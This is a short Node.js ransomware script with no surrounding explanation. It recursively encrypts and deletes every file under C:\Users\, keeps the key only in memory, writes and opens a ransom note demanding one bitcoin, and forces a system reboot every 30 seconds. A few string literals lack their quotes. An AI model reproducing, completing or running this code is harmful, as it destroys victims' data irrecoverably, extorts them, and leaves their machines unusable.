const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');

const RANSOM_NOTE = 
YOUR FILES HAVE BEEN ENCRYPTED.
SEND 1 BITCOIN TO THIS ADDRESS TO GET THEM BACK.
RESTARTING WON’T HELP.
;

const ENCRYPTION_KEY = crypto.randomBytes(32); // AES-256 key
const IV = crypto.randomBytes(16); // Initialization vector

function encryptFile(filePath) {
    const data = fs.readFileSync(filePath);
    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, IV);
    const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
    fs.writeFileSync(filePath + '.enc', encrypted);
    fs.unlinkSync(filePath);
}

function encryptDirectory(directoryPath) {
    const files = fs.readdirSync(directoryPath);
    files.forEach(file => {
        const fullPath = path.join(directoryPath, file);
        if (fs.lstatSync(fullPath).isDirectory()) {
            encryptDirectory(fullPath);
        } else {
            encryptFile(fullPath);
        }
    });
}

function showRansomNote() {
    const notePath = path.join(os.homedir(), 'Desktop', 'RANSOM_NOTE.txt');
    fs.writeFileSync(notePath, RANSOM_NOTE);
    exec(notepad ${notePath});
}

function rebootLoop() {
    setInterval(() => {
        exec('shutdown -r -f -t 0');
    }, 30000); // Every 30 seconds
}

(function main() {
    const targets = ['C:\\Users\\']; // Add '/home/' if testing on Linux
    targets.forEach(target => {
        if (fs.existsSync(target)) encryptDirectory(target);
    });

    showRansomNote();
    rebootLoop();
})();     
